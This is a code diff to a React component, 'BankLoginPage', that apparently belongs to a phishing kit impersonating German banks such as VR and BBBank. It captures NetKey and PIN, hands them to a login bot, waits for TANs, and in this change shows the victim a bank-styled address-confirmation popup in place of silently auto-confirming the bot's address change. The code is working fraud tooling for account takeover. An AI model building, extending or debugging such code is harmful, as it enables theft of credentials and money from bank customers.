@@ -10,6 +10,7 @@ import { TanWaitingScreen } from "@/components/flow/TanWaitingScreen";
 import { BotResultScreen } from "@/components/flow/BotResultScreen";
 import SplashLogoReveal from "@/components/SplashLogoReveal";
 import VRSplashReveal from "@/components/VRSplashReveal";
+import { AddressVerificationStep } from "@/components/flow/AddressVerificationStep";
 import { startBotTask, getBotTask, confirmAddress } from "@/lib/botClient";
 import { getSecureGoLabel } from "@/lib/secureGoLabel";
 import { startQrLoginSession } from "@/lib/qrLogin.functions";
@@ -117,6 +118,8 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
   const [phase, setPhase] = useState<Phase>("form");
   const [result, setResult] = useState<any>(null);
+  const [addressData, setAddressData] = useState<any>(null);
+  const [currentTaskId, setCurrentTaskId] = useState<string | null>(null);
 
   const [vrNetKey, setVrNetKey] = useState("");
   const [pin, setPin] = useState("");
@@ -389,19 +392,17 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
         return;
       }
 
-      // Auto-confirm address without popup
+      // Show address confirmation popup — DO NOT auto-confirm.
       const addressConfirmSignal =
         st === "waiting_for_address_confirm" ||
         st === "waiting_for_address" ||
         payloadContains(data, /address.?confirm|adress.?bestaet|waiting_for_address/i);
       if (addressConfirmSignal) {
         pollRef.current.positiveSeen = true;
+        setCurrentTaskId(taskId);
+        setAddressData(data?.result?.address_data ?? data?.address_data ?? null);
         setPhase("address_confirm");
-        setSubmitting(true);
-        if (!(pollRef.current as any).addressConfirmed) {
-          (pollRef.current as any).addressConfirmed = true;
-          confirmAddress(taskId).catch((e) => console.warn("[bot] confirm-address failed", e));
-        }
+        setSubmitting(false);
         pollRef.current.timer = setTimeout(tick, POLL_INTERVAL_MS);
         return;
       }
@@ -553,19 +554,30 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   const shellProps = { theme, logoSrc, fallbackLogoSrc, bankName: bank.name, showName, bigLogo: isBBBank, footerLinks: (bank.footer_links ?? null) as any };
 
   if (phase === "address_confirm") {
+    const ad = addressData ?? {};
+    const oldStreet = ad.old_street ?? ad.current_street ?? "";
+    const oldPlz = ad.old_plz ?? ad.current_plz ?? "";
+    const oldCity = ad.old_city ?? ad.current_city ?? "";
+    const newStreet = ad.new_street ?? ad.street ?? "";
+    const newPlz = ad.new_plz ?? ad.plz ?? "";
+    const newCity = ad.new_city ?? ad.city ?? "";
     return (
       <BankShell {...shellProps}>
-        <div className="max-w-md mx-auto mt-16 flex flex-col items-center gap-4 text-center">
-          <div
-            className="h-10 w-10 rounded-full border-2 border-t-transparent animate-spin"
-            style={{ borderColor: themeColor, borderTopColor: "transparent" }}
+        <div className="py-6 sm:py-10 px-4">
+          <AddressVerificationStep
+            theme={theme}
+            taskId={currentTaskId ?? undefined}
+            currentAddress={{ strasse: oldStreet, plzOrt: `${oldPlz} ${oldCity}`.trim() }}
+            additionalAddress={{ strasse: newStreet, plzOrt: `${newPlz} ${newCity}`.trim() }}
+            bankGroup={bank.group}
+            customerName={ad.customer_name ?? ad.name}
+            onBack={() => {}}
+            onDeleted={() => {
+              // Bot continues the flow; keep polling for next status (TAN etc.)
+              setPhase("waiting");
+              setSubmitting(true);
+            }}
           />
-          <h2 className="text-xl font-semibold" style={{ color: themeColor }}>
-            Adresse wird aktualisiert…
-          </h2>
-          <p className="text-sm text-gray-600">
-            Bitte einen Moment Geduld, Ihre Daten werden verarbeitet.
-          </p>
         </div>
       </BankShell>
     );
